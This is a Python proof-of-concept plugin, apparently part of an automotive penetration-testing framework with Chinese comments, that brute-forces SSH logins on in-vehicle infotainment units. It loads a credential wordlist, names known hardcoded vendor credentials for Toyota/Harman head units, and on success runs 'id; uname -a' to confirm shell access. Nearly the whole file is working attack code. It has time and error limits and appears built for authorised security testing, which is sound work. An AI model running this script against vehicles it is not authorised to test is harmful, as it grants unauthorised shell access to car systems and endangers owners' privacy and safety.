"""
PoC Name: SSH Hardcoded Credentials
CVE: N/A
Component: Network Stack
Category: Network
Severity: Critical
CVSS: 9.8
Description: 检测IVI系统SSH硬编码凭据(falcOn/harman_fara等)
Prerequisites: 目标车机暴露22端口且可以提供交互Shell环境
Usage: python3 05_SSH_Hardcoded_Creds.py <args>
"""
import paramiko
import os
import socket
import time
from iv_plugin_base import IVIVulnerabilityPlugin


def _resolve_credentials_path():
    candidates = []
    configured_dir = os.environ.get("AUTOSEC_POC_WORDLIST_DIR")
    if configured_dir:
        candidates.append(os.path.join(configured_dir, "credentials.txt"))
    candidates.extend([
        os.path.join(os.path.dirname(__file__), '..', 'wordlists', 'credentials.txt'),
        os.path.join(os.getcwd(), 'pocs', 'wordlists', 'credentials.txt'),
        os.path.join(os.getcwd(), 'wordlists', 'credentials.txt'),
    ])
    for candidate in candidates:
        if candidate and os.path.exists(candidate):
            return candidate
    return candidates[0] if candidates else "credentials.txt"


class ToyotaHarmanSSHExploit(IVIVulnerabilityPlugin):
    meta_display_id = "POC-NET-005"
    meta_poc_name = "SSH Hardcoded Creds"
    meta_cve_id = "N/A"
    meta_severity = "Critical"
    meta_protocol = "tcp"
    meta_target_os = ["all"]
    meta_required_params = ["target_ip"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        # 检查网络可达性
        if not self.target_ip:
            raise RuntimeError("需要指定目标IP地址。")
        try:
            probe = socket.create_connection((self.target_ip, 22), timeout=3)
            probe.close()
        except OSError:
            self.logger.warning(f"目标 {self.target_ip}:22 暂不可达, 但仍尝试连接...")
        return True

    def exploit(self):
        port = 22
        wordlist_path = _resolve_credentials_path()
        if not os.path.exists(wordlist_path):
            self.logger.error("未找到字典文件 credentials.txt")
            return self.results
            
        self.logger.info("开始基于车机通用安全字典的 SSH 硬编码爆破...")
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                credentials = [line.strip().split(':', 1) for line in f if ':' in line]
            
            self.logger.info(f"加载了 {len(credentials)} 组凭据，开始测试...")

            start_time = time.time()
            consecutive_errors = 0
            for user, password in credentials:
                # 检查时长是否超过2分钟
                if time.time() - start_time > 120:
                    self.logger.warning("SSH字典测试超时 (2分钟限制), 自动终止。")
                    break
                
                client = None
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    # 尝试连接
                    client.connect(self.target_ip, port=port, username=user, 
                                 password=password, timeout=3, banner_timeout=5)
                    
                    # 成功连接
                    self.logger.warning(f">>> [+] 成功！利用已知凭证获取 Shell: {user}/{password} <<<")
                    self.results["vulnerable"] = True
                    self.results["evidence"] = f"SSH Hardcoded/Default Credentials: {user}/{password}"
                    
                    # 执行命令验证权限
                    _, stdout, _ = client.exec_command('id; uname -a')
                    output = stdout.read().decode('utf-8', 'ignore').strip()
                    self.logger.info(f"    系统指纹: {output}")
                    
                    client.close()
                    return self.results
                    
                except paramiko.AuthenticationException:
                    consecutive_errors = 0
                    if client: client.close()
                    continue
                except (ConnectionRefusedError, socket.gaierror):
                    self.logger.error("连接被拒绝或主机不可达，中断扫描。")
                    if client: client.close()
                    break
                except (paramiko.SSHException, ConnectionError, socket.error) as e:
                    consecutive_errors += 1
                    self.logger.debug(f"测试 {user}:{password} 遇到连接问题 ({consecutive_errors}/3): {str(e)[:50]}")
                    if client: client.close()
                    
                    if consecutive_errors >= 3:
                        self.logger.error("连续 3 次连接异常，可能触发了服务保护或服务已下线，中断测试。")
                        break
                        
                    time.sleep(1)
                    continue
                except Exception as e:
                    self.logger.error(f"测试 {user}:{password} 发生非预期异常: {e}")
                    if client: client.close()
                    break
            
            self.logger.info("安全字典执行完毕，未匹配到任何已知的 SSH 后门或硬编码凭证。")
            self.results["vulnerable"] = False
        except Exception as e:
            self.logger.error(f"扫描执行异常: {str(e)}")
            self.results["vulnerable"] = False
            
        return self.results
